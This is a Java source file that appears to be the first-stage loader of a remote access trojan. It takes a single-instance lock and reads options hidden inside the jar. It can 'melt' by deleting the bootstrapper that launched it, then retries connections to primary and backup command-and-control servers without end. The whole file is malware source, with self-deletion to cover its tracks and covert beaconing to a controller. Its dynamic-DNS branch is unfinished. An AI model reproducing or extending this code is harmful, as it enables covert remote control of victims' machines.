package subterranean.crimson.permajar.stage1;

import java.io.File;
import java.io.InputStream;
import java.util.HashMap;
import java.util.Scanner;

import subterranean.crimson.permajar.stage1.network.Communications;
import subterranean.crimson.universal.FileLocking;
import subterranean.crimson.universal.containers.AddressSpec;
import subterranean.crimson.universal.containers.Options;
import subterranean.crimson.universal.objects.InvalidObjectException;
import subterranean.crimson.universal.objects.ObjectTransfer;

public class Stage1 {

	public static Options options;

	public static void run(String[] arguments) {
		if (FileLocking.lockExists()) {
			// stop
			return;
		} else {
			FileLocking.lock();

		}

		// Load options from internal text file
		loadOptions();

		// Delete bootstrapper if needed
		if (options.melt) {
			if (arguments.length != 0) {
				File f = new File(arguments[0]);
				f.delete();
			}
		}

		connectionRoutine();

	}

	public static void connectionRoutine() {
		// Establish a network connection
		long connectionAttempts = 0;

		while (true) {
			AddressSpec serverAddress = null;
			int port = 0;
			if (!options.crimsonDNS) {
				if (connectionAttempts % 2 == 1) {
					if (options.backupAddress != null) {
						serverAddress = options.backupAddress;
						port = options.backupPort.getPort();
					} else {
						serverAddress = options.primaryAddress;
						port = options.primaryPort.getPort();
					}

				} else {
					serverAddress = options.primaryAddress;
					port = options.primaryPort.getPort();
				}

			} else {
				// using CrimsonDNS. query the server TODO
				HashMap<String, String> params = new HashMap<String, String>();
				params.put("name", "GETCDADDRESS");
				params.put("username", options.crimsonDNS_user);
				params.put("password", options.crimsonDNS_hash);
				serverAddress = new AddressSpec("");
			}

			if (!Communications.connect(serverAddress.getIPAddress(), port, options.ssl)) {
				connectionAttempts++;
				// connection was unsuccessful
				try {
					Thread.sleep(options.connectPeriod);
				} catch (InterruptedException e) {

				}
				continue;

			} else {
				// connection was successful
				break;
			}

		}

	}

	public static void loadOptions() {

		InputStream in = Stage1.class.getResourceAsStream("/subterranean/crimson/options");
		if (in == null) {
			// the options file was not found
			return;
		}
		Scanner s = new Scanner(in);
		Options o = null;
		if (!s.hasNextLine()) {
			// empty options file
			// error
		} else {
			try {
				o = (Options) ObjectTransfer.fromString(s.nextLine(), false);

			} catch (InvalidObjectException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		}
		s.close();
		options = o;
	}

}